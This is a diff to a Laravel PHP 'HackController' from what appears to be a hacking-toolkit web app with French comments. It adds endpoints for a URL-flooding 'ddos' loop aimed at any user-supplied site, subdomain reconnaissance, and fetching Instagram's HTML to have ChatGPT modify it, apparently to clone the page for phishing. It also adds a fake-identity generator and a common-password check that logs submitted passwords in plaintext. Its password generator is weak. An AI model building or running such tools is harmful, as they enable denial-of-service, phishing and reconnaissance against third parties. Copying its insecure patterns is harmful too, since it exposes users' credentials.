@@ -9,8 +9,11 @@ use Illuminate\Http\Request;
 use PHPMailer\PHPMailer\Exception;
 use PHPMailer\PHPMailer\PHPMailer;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Http;
 use GuzzleHttp\Exception\RequestException;
 use Symfony\Component\HttpKernel\Exception\HttpException;
+use Faker\Factory as Faker;
+use App\Http\Controllers\Controller;
 
 
 class HackController extends Controller
@@ -57,7 +60,7 @@ class HackController extends Controller
     
             // Enregistrer le log de l'utilisateur
             try {
-                $log = Log::create([
+                Log::create([
                     'utilisateur_id' => $user->id,
                     'fonctionnalite_id' => 4, // ID de la fonctionnalité
                     'description_action' => "email Check on :" . $data['data']['email']
@@ -67,7 +70,7 @@ class HackController extends Controller
             }
     
             // Retourner les informations extraites
-            return response()->json($result);
+            return response()->json($result);   
     
         } catch (RequestException $e) {
             if ($e->hasResponse()) {
@@ -128,7 +131,7 @@ class HackController extends Controller
 
             }
 
-            $log = Log::create([
+            Log::create([
                 'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
                 'fonctionnalite_id' => 5,       // ID de la fonctionnalité (connexion)
                 'description_action' => "envoi de ".$request->nombreEmail." email(s) à ".$request->destinataire  // Description de l'action
@@ -142,7 +145,253 @@ class HackController extends Controller
         }
     }
     
+    public function checkPassword(Request $request)
+    {
+        // Vérifier que l'utilisateur est authentifié
+        $user = Auth::user();
+
+        if (!$user) {
+            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
+        }
+
+        // Valider que la requête a bien un paramètre 'password'
+        $request->validate([
+            'password' => 'required|string',
+        ]);
+
+        // Récupérer le mot de passe depuis la requête
+        $password = $request->password;
+
+        // URL du fichier texte brut sur GitHub
+        $url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt';
+
+        try {
+            // Récupérer le contenu du fichier
+            $response = Http::get($url);
+
+            if ($response->failed()) {
+                return response()->json(['error' => 'Erreur lors de la récupération du fichier'], 500);
+            }
+
+            // Contenu du fichier texte
+            $fileContent = $response->body();
+
+            // Découper le contenu du fichier en un tableau de mots (chaque mot sur une ligne)
+            $passwordsList = explode("\n", $fileContent);
+
+            // Vérifier si le mot de passe existe dans la liste
+            $isPasswordInList = in_array(trim($password), array_map('trim', $passwordsList));
+
+            Log::create([
+                'utilisateur_id' => $user->id,  // ID de l'utilisateur connecté
+                'fonctionnalite_id' => 7,       // ID de la fonctionnalité (connexion)
+                'description_action' => "password checking sur le pwd :".$request->password
+            ]);
+
+            // Retourner une réponse JSON avec 'true' ou 'false'
+            return response()->json(['exists' => $isPasswordInList]);
+
+        } catch (\Exception $e) {
+            // Gérer les erreurs inattendues
+            return response()->json(['error' => 'Erreur inattendue: ' . $e->getMessage()], 500);
+        }
+    }
+
+    public function modifyHtml()
+    {
+        // URL de la page à récupérer
+        $url = 'https://www.instagram.com'; // Mettez l'URL désirée ici
+
+        // Créez un client Guzzle
+        $client = new Client();
+
+        // Étape 1 : Récupérer le HTML de la page
+        try {
+            $response = $client->request('GET', $url);
+            $html = $response->getBody()->getContents();
+        } catch (\Exception $e) {
+            return response()->json(['error' => 'Erreur lors de la récupération de la page'], 500);
+        }
+
+        // Étape 2 : Modifier le HTML avec l'API de ChatGPT
+        $chatGptApiKey = env('CHATGPT_API_KEY'); // Assurez-vous d'avoir cette clé dans votre fichier .env
+
+        $client = new Client();
+
+        try {
+            $response = $client->post('https://api.openai.com/v1/chat/completions', [
+                'headers' => [
+                    'Authorization' => 'Bearer ' . $chatGptApiKey,
+                    'Content-Type' => 'application/json',
+                ],
+                'json' => [
+                    'model' => 'gpt-3.5-turbo', // Vous pouvez changer le modèle si nécessaire
+                    'messages' => [
+                        ['role' => 'user', 'content' => "Voici le HTML de la page Instagram : $html. Modifie-le selon mes spécifications."],
+                    ],
+                ],
+            ]);
+
+            $result = json_decode($response->getBody(), true);
+            $modifiedHtml = $result['choices'][0]['message']['content'] ?? 'Aucun contenu modifié';
+        } catch (\Exception $e) {
+            return response()->json(['error' => 'Erreur lors de l\'appel à l\'API ChatGPT'], 500);
+        }
+
+        // Étape 3 : Retourner le HTML modifié
+        return response()->json(['modified_html' => $modifiedHtml]);
+    }
+
+    public function generatePassword()
+    {
+
+        $password = substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:<>?'), 0, 16);
+
+        // Enregistrer le log de l'utilisateur
+        $user = Auth::user();
+
+        if (!$user) {
+            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
+        }
+
+        try {
+            Log::create([
+                'utilisateur_id' => $user->id,
+                'fonctionnalite_id' => 8, // ID de la fonctionnalité
+                'description_action' => "Génération d'un mot de passe aléatoire"
+            ]);
+        } catch (\Exception $e) {
+            return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
+        }
+
+        // Retourner le mot de passe généré
+        return response()->json(['password' => $password]);
+    }
+    
+    
+    public function getSubdomains($domain)
+    {
+        // Définis ta clé d'API SecurityTrails ici ou dans le fichier .env
+        $apiKey = env('SECURITYTRAILS_API_KEY');
+
+        $user = Auth::user();
+
+        if (!$user) {
+            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
+        }
+
+        // return response()->json($apiKey);
+
+        // L'URL de l'API pour récupérer les sous-domaines
+        $url = "https://api.securitytrails.com/v1/domain/{$domain}/subdomains";
+
+        // Effectue la requête GET
+        $response = Http::withHeaders([
+            'APIKEY' => $apiKey 
+        ])->get($url);
 
 
-            
+        // Vérifie si la requête a réussi
+        if ($response->successful()) {
+
+            try {
+                Log::create([
+                    'utilisateur_id' => $user->id,
+                    'fonctionnalite_id' => 9, // ID de la fonctionnalité
+                    'description_action' => "recuperation des sous-domaines de :".$domain
+                ]);
+            } catch (\Exception $e) {
+                return response()->json(['error' => 'Erreur lors de l\'enregistrement du log: ' . $e->getMessage()], 500);
+            }
+
+            // Récupère et retourne les sous-domaines en JSON
+            return response()->json($response->json());
+        }
+
+        // Gère les erreurs en cas de problème
+        return response()->json([
+            'error' => 'Impossible de récupérer les sous-domaines.'
+        ], $response->status());
+    }
+
+    public function ddos(Request $request)
+    {
+
+        $user = Auth::user();
+
+        if (!$user) {
+            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
+        }
+        // Valider les données d'entrée
+        $request->validate([
+            'url' => 'required|url', // Vérifie que l'URL est valide
+            'count' => 'required|integer|min:1', // Vérifie que count est un entier positif
+        ]);
+
+        $url = $request->input('url');
+        $count = $request->input('count');
+        $responses = [];
+
+        try {
+            Log::create([
+                'utilisateur_id' => $user->id,
+                'fonctionnalite_id' => 11, // ID de la fonctionnalité
+                'description_action' => "attaque ddos sur :".$url." avec ".$count." requêtes"
+            ]);
+        } catch (\Exception $e) {
+            return response()->json(['error' => 'Error saving log: ' . $e->getMessage()], 500);
+        }
+
+        // Envoie les requêtes en boucle
+        for ($i = 0; $i < $count; $i++) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            $output = curl_exec($ch);
+            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+
+            // Enregistre la réponse ou le code HTTP
+            $responses[] = [
+                'request_number' => $i + 1,
+                'http_code' => $httpCode,
+                'response' => $output,
+            ];
+        }
+
+        return response()->json($responses);
+    }
+
+    public function generateIdentity()
+    {
+        // Récupérer l'utilisateur authentifié
+        $user = Auth::user();
+
+        if (!$user) {
+            return response()->json(['error' => 'Utilisateur non authentifié'], 401);
+        }
+        // Créer une instance de Faker
+        $faker = Faker::create();
+
+        // Générer une identité fictive
+        $fakeIdentity = [
+            'name' => $faker->name,
+            'email' => $faker->email,
+            'address' => $faker->address,
+            'phone' => $faker->phoneNumber,
+        ];
+
+        // Enregistrer l'action dans les logs
+        try {
+            Log::create([
+                'utilisateur_id' => $user->id,
+                'fonctionnalite_id' => 10, // ID de la fonctionnalité
+                'description_action' => "generation d'une identité fictive : ".$fakeIdentity['name']
+            ]);
+        } catch (\Exception $e) {
+            return response()->json(['error' => 'Error saving log: ' . $e->getMessage()], 500);
+        }
+        // Retourner la réponse JSON
+        return response()->json($fakeIdentity);
+    }
 }
